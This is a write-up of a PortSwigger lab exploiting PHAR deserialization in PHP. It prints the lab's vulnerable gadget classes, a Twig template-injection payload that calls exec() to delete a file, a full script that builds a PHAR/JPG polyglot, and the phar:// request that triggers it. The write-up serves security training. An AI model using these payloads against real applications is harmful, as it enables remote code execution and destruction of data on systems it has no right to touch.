# Using PHAR deserialization to deploy a custom gadget chain

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain), you'll learn: Using PHAR deserialization to deploy a custom gadget chain! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

This lab does not explicitly use [deserialization](https://portswigger.net/web-security/deserialization). However, if you combine `PHAR` deserialization with other advanced hacking techniques, you can still achieve remote code execution via a custom gadget chain.

To solve the lab, delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113140551.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113140606.png)

In here, we can upload an avatar image file.

We can try to upload a valid image file:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113140748.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113140812.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113140829.png)

When we clicked the "Upload" button, it'll send a POST request to `/my-account/avatar`.

Let's view our avatar:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113141046.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113141123.png)

**It reaches `/cgi-bin/avatar.php`**, with GET parameter `avatar` and it's value is our username.

**Let's check `/cgi-bin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113141451.png)

As you can see, it has 3 PHP files: `CustomTemplate.php`, `Blog.php`, `avatar.php`.

The first two of them's source code can be view, as it appended a `~`  character is the end of the extension.

**`CustomTemplate.php`:**
```php
<?php

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>
```

**In `CustomTemplate.php`, there is a class called `CustomTemplate`.**

**Also, there is a `__destruct()` magic method, which will be invoked when the PHP script is stopped or exited.**

**When this method is invoked, it'll delete a file from `CustomTemplate->lockFilePath()`, which is `templates/$CustomTemplate->template_file_path.lock`.**

**Moreover, the `isTemplateLocked()` method is using `file_exists()` method on `CustomTemplate->lockFilePath()` attribute.**

**`Blog.php`:**
```php
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}

?>
```

**In `Blog.php`, it uses Twig template engine, and there is a class called `Blog`.**

**The `__wakeup()` magic method is interesting for us, as it'll automatically invoked during the deserialization process.**

**When the `__wakeup()` magic method is invoked, it'll create a new object from `Twig_Environment()`, and it's referring the `Blog->desc` attribute.**

Armed with above information, we can **exploit SSTI (Server-Side Template Injection) and using PHAR stream to gain remote code execution**!

- SSTI:

**According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php), we can gain remote code execution via:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113144922.png)

**Payload:**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
```

- PHAR:

**Now we have a SSTI payload, we can build a PHP payload:**
```php
class CustomTemplate {}
class Blog {}

$object = new CustomTemplate;
$blog = new Blog;

$blog->user = 'any_user_you_want';
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';

$object->template_file_path = $blog;
```

This payload will set a SSTI payload in the `Blog->desc` attribute, which will then parsed to `CustomTemplate->template_file_path`.

**Finally, we can create a PHAR payload.**

**According to [this GitHub repository](https://github.com/kunte0/phar-jpg-polyglot), we can create a PHAR JPG ploygot:**
```shell
┌[root♥siunam]-(/opt)-[2023.01.13|15:21:05]
└> git clone https://github.com/kunte0/phar-jpg-polyglot.git;cd phar-jpg-polyglot
```

**`phar_jpg_polyglot.php`:**
```php
<?php


function generate_base_phar($o, $prefix){
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($o);
    $phar->stopBuffering();
    
    $basecontent = file_get_contents($tempname);
    @unlink($tempname);
    return $basecontent;
}

function generate_polyglot($phar, $jpeg){
    $phar = substr($phar, 6); // remove <?php dosent work with prefix
    $len = strlen($phar) + 2; // fixed 
    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
    $contents = substr($new, 0, 148) . "        " . substr($new, 156);

    // calc tar checksum
    $chksum = 0;
    for ($i=0; $i<512; $i++){
        $chksum += ord(substr($contents, $i, 1));
    }
    // embed checksum
    $oct = sprintf("%07o", $chksum);
    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
    return $contents;
}


// pop exploit class
class CustomTemplate {}
class Blog {}

$object = new CustomTemplate;
$blog = new Blog;
$blog->user = 'any_user_you_want';
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$object->template_file_path = $blog;


// config for jpg
$tempname = 'temp.tar.phar'; // make it tar
$jpeg = file_get_contents('in.jpg');
$outfile = 'out.jpg';
$payload = $object;
$prefix = '';

var_dump(serialize($object));


// make jpg
file_put_contents($outfile, generate_polyglot(generate_base_phar($payload, $prefix), $jpeg));

/*
// config for gif
$prefix = "\x47\x49\x46\x38\x39\x61" . "\x2c\x01\x2c\x01"; // gif header, size 300 x 300
$tempname = 'temp.phar'; // make it phar
$outfile = 'out.gif';

// make gif
file_put_contents($outfile, generate_base_phar($payload, $prefix));

*/
```

**Generate PHAR JPG polygot:**
```shell
┌[root♥siunam]-(/opt/phar-jpg-polyglot)-[2023.01.13|15:23:56]-[git://master ✗]
└> php -c php.ini phar_jpg_polyglot.php
string(229) "O:14:"CustomTemplate":1:{s:18:"template_file_path";O:4:"Blog":2:{s:4:"user";s:17:"any_user_you_want";s:4:"desc";s:106:"{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}";}}"
┌[root♥siunam]-(/opt/phar-jpg-polyglot)-[2023.01.13|15:23:58]-[git://master ✗]
└> ls -lah out.jpg     
-rw-r--r-- 1 root root 132K Jan 13 15:23 out.jpg
```

**Upload it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113152517.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113152530.png)

**Then, we can send a GET requesto to `/cgi-bin/avatar.php`, with parameter `avatar`, and value `phar://wiener`. This will use the PHAR stream, which will trigger the remote code execution payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-10/images/Pasted%20image%2020230113152716.png)

Nice!

# What we've learned:

1. Using PHAR deserialization to deploy a custom gadget chain